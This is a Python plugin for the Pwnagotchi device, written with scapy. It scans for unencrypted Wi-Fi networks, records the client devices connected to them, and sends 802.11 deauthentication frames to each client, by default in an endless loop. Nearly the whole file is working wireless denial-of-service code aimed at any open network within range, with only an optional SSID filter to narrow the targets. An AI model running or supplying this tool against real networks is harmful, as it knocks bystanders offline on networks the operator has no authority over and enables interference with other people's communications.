import logging
import pwnagotchi.plugins as plugins
from scapy.all import *
import threading
import time

class OpenNetworkDeauther(plugins.Plugin):
    __author__ = 'betab0t'
    __version__ = '0.0.2'
    __license__ = 'GPL3'
    __description__ = 'A Pwnagotchi plugin to scan for open Wi-Fi networks and deauth clients'

    def __init__(self):
        self.running = False
        self.interface = None
        self.networks = {}  # {BSSID: {ssid, channel, clients}}
        self.deauth_interval = 0.1
        self.deauth_count = None  # None for infinite
        self.deauth_loop = 1  # Infinite loop if count is None
        self.verbose = True

    def on_loaded(self):
        logging.info("[OpenNetworkDeauther] Plugin loaded")
        self.interface = self.options.get('interface', 'wlan0mon')
        self.deauth_interval = float(self.options.get('interval', 0.1))
        self.deauth_count = int(self.options.get('count', 0)) or None
        self.verbose = self.options.get('verbose', True)
        self.target_ssid = self.options.get('target_ssid', None)  # Optional: limit to specific SSID
        if self.deauth_count == 0:
            self.deauth_loop = 1
            self.deauth_count = None
        else:
            self.deauth_loop = 0
        logging.info(f"[OpenNetworkDeauther] Config: interface={self.interface}, interval={self.deauth_interval}, count={self.deauth_count}, verbose={self.verbose}")

    def on_unload(self, ui):
        self.stop()
        logging.info("[OpenNetworkDeauther] Plugin unloaded")

    def on_ready(self, agent):
        logging.info("[OpenNetworkDeauther] Plugin ready")
        self.start()

    def start(self):
        if not self.running:
            self.running = True
            logging.info("[OpenNetworkDeauther] Starting open network scan and deauth")
            self.scan_thread = threading.Thread(target=self.scan_and_deauth)
            self.scan_thread.daemon = True
            self.scan_thread.start()

    def stop(self):
        if self.running:
            self.running = False
            logging.info("[OpenNetworkDeauther] Stopping scan and deauth")
            self.scan_thread.join()

    def deauth(self, target_mac, gateway_mac):
        try:
            # Craft 802.11 deauth frame
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            # Send the packet
            sendp(packet, inter=self.deauth_interval, count=self.deauth_count, loop=self.deauth_loop, iface=self.interface, verbose=self.verbose)
            if self.verbose:
                if self.deauth_count:
                    logging.info(f"[OpenNetworkDeauther] Sent {self.deauth_count} deauth frames to {target_mac} on BSSID {gateway_mac}")
                else:
                    logging.info(f"[OpenNetworkDeauther] Sending deauth frames to {target_mac} on BSSID {gateway_mac} indefinitely")
        except Exception as e:
            logging.error(f"[OpenNetworkDeauther] Error sending deauth: {e}")

    def scan_and_deauth(self):
        def packet_handler(packet):
            # Handle beacon frames to find open networks
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr2
                if bssid not in self.networks:
                    ssid = packet[Dot11Elt].info.decode('utf-8', 'ignore') if packet[Dot11Elt].info else '<Hidden>'
                    # Filter by target SSID if specified
                    if self.target_ssid and ssid != self.target_ssid:
                        return
                    encryption = self.get_encryption(packet)
                    if encryption == 'Open':
                        channel = int(packet[Dot11Elt:3].info[0]) if packet[Dot11Elt:3].info else 0
                        self.networks[bssid] = {
                            'ssid': ssid,
                            'channel': channel,
                            'clients': set()  # Track client MACs
                        }
                        logging.info(f"[OpenNetworkDeauther] Found open network: SSID={ssid}, BSSID={bssid}, Channel={channel}")
            # Handle data frames to find associated clients
            elif packet.haslayer(Dot11) and packet.type == 2:  # Data frames
                bssid = packet[Dot11].addr3
                if bssid in self.networks:
                    client = packet[Dot11].addr1 if packet[Dot11].FCfield & 0x2 else packet[Dot11].addr2
                    if client != bssid and client != 'ff:ff:ff:ff:ff:ff':
                        self.networks[bssid]['clients'].add(client)
                        logging.info(f"[OpenNetworkDeauther] Found client {client} on BSSID {bssid}")

        try:
            while self.running:
                # Scan for networks and clients
                sniff(iface=self.interface, prn=packet_handler, timeout=10, store=0)
                # Deauth clients for each open network
                for bssid, info in self.networks.items():
                    for client in info['clients']:
                        if self.running:
                            self.deauth(client, bssid)
                            time.sleep(0.5)  # Small delay to avoid overwhelming the interface
        except Exception as e:
            logging.error(f"[OpenNetworkDeauther] Error during scan/deauth: {e}")
            self.running = False

    def get_encryption(self, packet):
        cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
        return 'Open' if 'privacy' not in cap else 'Encrypted'

    def on_ui_update(self, ui):
        if self.networks:
            network_list = [f"{info['ssid']} ({bssid}, {len(info['clients'])} clients)" for bssid, info in self.networks.items()]
            ui.set('deauth_networks', ', '.join(network_list[:3]))
        else:
            ui.set('deauth_networks', 'None')

# Plugin options
def options():
    return {
        'interface': 'wlan0mon',
        'interval': 0.1,  # Time between deauth frames
        'count': 0,  # 0 for infinite deauth
        'verbose': True,
        'target_ssid': None  # Optional: limit to specific SSID

    }

